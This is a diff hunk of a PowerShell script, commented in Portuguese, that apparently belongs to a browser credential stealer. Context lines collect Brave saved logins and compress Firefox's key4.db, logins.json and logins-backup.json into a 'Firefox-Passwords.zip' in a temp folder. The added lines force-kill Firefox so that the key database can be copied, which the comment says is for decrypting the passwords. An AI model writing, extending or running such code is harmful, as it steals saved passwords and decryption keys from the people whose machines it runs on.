@@ -535,6 +535,10 @@ Get-BrowserData -Browser "brave" -DataType "logins" >> $env:TMP\$FolderName\Brow
 # Move o ficheiro para o local correto
 Move-Item -Path "$env:TMP\$FolderName\BrowserData.txt" -Destination "$env:TEMP\$FolderName\Dados-do-Browser\BrowserData.txt"
 
+
+# Termina o processo firefox, para sacar a key4.db "para desencriptar as passwords"
+Get-Process -Name "firefox" | Stop-Process -Force
+
 # Puxa as palavra passes encriptadas do firefox
 Compress-Archive -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\key4.db", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins-backup.json" -DestinationPath "$env:TEMP\$FolderName\Dados-do-Browser\Firefox-Passwords.zip"
 
